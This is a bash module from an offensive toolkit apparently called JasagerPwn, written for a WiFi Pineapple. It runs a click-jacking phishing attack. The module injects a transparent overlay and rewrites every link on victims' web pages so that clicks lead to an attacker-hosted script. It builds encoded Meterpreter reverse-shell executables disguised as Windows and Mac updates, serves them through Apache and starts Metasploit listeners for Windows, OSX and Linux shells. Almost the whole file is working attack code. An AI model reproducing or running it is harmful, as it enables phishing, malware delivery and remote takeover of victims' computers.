#
# - Hijack all user clicks inside the browser with
#   with an inejcted, transparent onclick() <div>
#	- User's click will call a PHP script that chooses
# 	  the correct payload for the victims system OS.
#
# Author: Leg3nd @ https://leg3nd.me
#

################ Module Configuration ##
# Module Title
title="Click Jacker"
# Create a description for menu
description="Click-Jacking Phishing"
# Letter keys/commands to select item in menu
bindings='C|c'
#########################################

# Variables
clickjack_www="/var/www/click-jacking"

# Start Function
function start_clickjacking(){
  echo -e "\e[01;34m[>]\e[00m Running Click Jacking Injection Attack..."  
  if [ ! -e "${clickjack_www}" ]; then mkdir "${clickjack_www}" ; fi
 
  # Our Applet Code to Inject - overlay a full screen clickable <div> and replace all <a href=""> 
  # links to force a download of a payload. Very frusterating to a user so they click it.
  #click_jack_data='<meta http-equiv="cache-control" content="no-cache" /><meta http-equiv="X-UA-Compatible" content="IE=9"><script src="http://code.jquery.com/jquery-1.9.1.min.js"></script><script>$(document).ready(function(){var div=document.createElement("div");div.id="overlay";div.style.zIndex="100";div.style.width="100%";div.style.height="100%";div.style.position="fixed";div.onclick=function(){window.open("http://'${our_ip}'/run.php")};if(document.body.firstChild)document.body.insertBefore(div,document.body.firstChild);else document.body.appendChild(div)});</script>'
  click_jack_data='<meta http-equiv="cache-control"content="no-cache"><meta http-equiv="X-UA-Compatible"content="IE=9"><script src="http://code.jquery.com/jquery-1.9.1.min.js" /><script>$(document).ready(function(){var div=document.createElement("div");div.id="overlayclick";div.style.zIndex="100";div.style.width="100%";div.style.height="100%";div.style.position="fixed";div.onclick=function(){window.open("http://'${our_ip}'/run.php")};if(document.body.firstChild)document.body.insertBefore(div,document.body.firstChild);else document.body.appendChild(div)});</script><script>$(document).ready(function(){$("a").attr("href","http://'${our_ip}'/run.php")});</script>'
  
  # Clean Up
  if [ -e "src/web_templates/clickjack-www/osx.bin" ]; then rm -f "src/web_templates/clickjack-www/osx.bin"; fi
  if [ -e "src/web_templates/clickjack-www/Windows-KB183905-x86-ENU.exe" ]; then rm -f "src/web_templates/clickjack-www/Windows-KB183905-x86-ENU.exe"; fi

  # Windows Payload
  echo -e "\e[01;34m[>]\e[00m Generating binary payloads..."  
  if [ ! "${windows_payload}" ]; then
    xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasagerPwn] v${version} - Metasploit (Windows)" -e "msfpayload windows/meterpreter/reverse_tcp LHOST=${our_ip} LPORT=${win_port} R | msfencode -t exe -e x86/shikata_ga_nai -c 10 -o ${clickjack_www}/Windows-KB183905-x86-ENU.exe"
  else
    if [ -e "${windows_payload}" ]; then
      cp -f "${windows_payload}" "${clickjack_www}/Windows-KB183905-x86-ENU.exe"
    else
      echo -e "\e[01;34m[-]\e[00m Notice: Windows Payload was not found. Defaulting back to metasploit..."
      xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasagerPwn] v${version} - Metasploit (Windows)" -e "msfpayload windows/meterpreter/reverse_tcp LHOST=${our_ip} LPORT=${win_port} R | msfencode -t exe -e x86/shikata_ga_nai -c 10 -o ${clickjack_www}/Windows-KB183905-x86-ENU.exe"
    fi
  fi

  # Mac Payload  - we need a .pkg payload for Mac OSX
  if [ ! "${mac_payload}" ] || [ ! -e "${mac_payload}" ]; then
    echo -e "\e[01;31m[!]\e[00m Error: Mac Payload not found and a metasploit payload will not work. Set your payload name in \"mac_payload\": ${mac_payload}"
    sleep 1
  else
    cp -f "${mac_payload}" "src/web_templates/clickjack-www/Apple_MacOSX_Update.pkg"
  fi
  
  # Just keep the victim off our server other than payload downloads
  echo -e "\e[01;34m[>]\e[00m Setting up Apache server...."  
  echo -e '<html>\n<head><meta http-equiv="refresh" content="0; url=http://yahoo.com/"></head></html>' 1> ${clickjack_www}/index.html 2> /dev/null
  cp src/web_templates/clickjack-www/* "${clickjack_www}/"
  echo ${click_jack_data} 1> ${clickjack_www}/injectme.txt 2> /dev/null
  sed -i "s/REPLACEMEIP/${our_ip}/g" ${clickjack_www}/run.php 2> /dev/null
  chown -R www-data:www-data "${clickjack_www}/" 2> /dev/null
  
  # Start up our apache server to host the payloads
  echo "<VirtualHost *:80>
	  ServerAdmin webmaster@localhost
	  DocumentRoot ${clickjack_www}
	  <Directory />
		  Options FollowSymLinks
		  AllowOverride None
	  </Directory>
	  <Directory ${clickjack_www}>
		  Options Indexes FollowSymLinks MultiViews
		  AllowOverride None
		  Order allow,deny
		  allow from all
	  </Directory>
	  ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
	  <directory \"/usr/lib/cgi-bin\">
		  AllowOverride None
		  Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
		  Order allow,deny
		  Allow from all
	  </directory>
	  ErrorDocument 403 /index.html
	  ErrorDocument 404 /index.html
  </VirtualHost>
  " > /etc/apache2/sites-available/click-jacking
  
  xterm -geometry 75x8+100+0 -T "[JasagerPwn] v${version} - Starting Apache2" -e "ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite click-jacking && a2enmod php5 && /etc/init.d/apache2 reload"
  service apache2 restart > /dev/null 2>&1
  
  # Metasploit resource script
  echo -e "use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${win_port}
  set ExitOnSession false
  set InitialAutorunScript \"\"
  set AutoRunScript \"\"
  set InitialAutorunScript multiscript -rc /tmp/autorun.rc
  exploit -j
  set PAYLOAD osx/x86/shell_reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${osx_port}
  set ExitOnSession false
  set InitialAutorunScript \"\"
  set AutoRunScript \"\"
  exploit -j
  set PAYLOAD linux/x86/shell/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${nix_port}
  set ExitOnSession false
  set InitialAutorunScript \"\"
  set AutoRunScript \"\"
  exploit -j
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${ps_win_port}
  set InitialAutorunScript \"\"
  set AutoRunScript migrate -f -k
  set ExitOnSession false
  exploit -j
  jobs -v" > /tmp/msfrc
  
  # Get our payload listener's ready
  echo -e "\e[01;34m[>]\e[00m Starting metasploit listeners..."  
  terminator -e "msfconsole -r /tmp/msfrc" > /dev/null 2>&1 &

  # Start up code injector for java applet injection
  echo -e "\e[01;34m[>]\e[00m Enabling code injection on pineapple.."    
  command="killall -9 python; wget -O /pineapple/components/infusions/strip-n-inject/includes/proxy/injection.txt http://${our_ip}/injectme.txt ; echo ${our_ip} > /pineapple/components/infusions/strip-n-inject/includes/proxy/attacker_ip.txt ; cd /pineapple/components/infusions/strip-n-inject/includes/ ; bash start.sh"
  pineapple_command
}

# Stop Function
function stop_clickjacking(){
  command="cd /pineapple/components/infusions/codeinject/includes/ ; bash stop.sh"
  pineapple_command
}
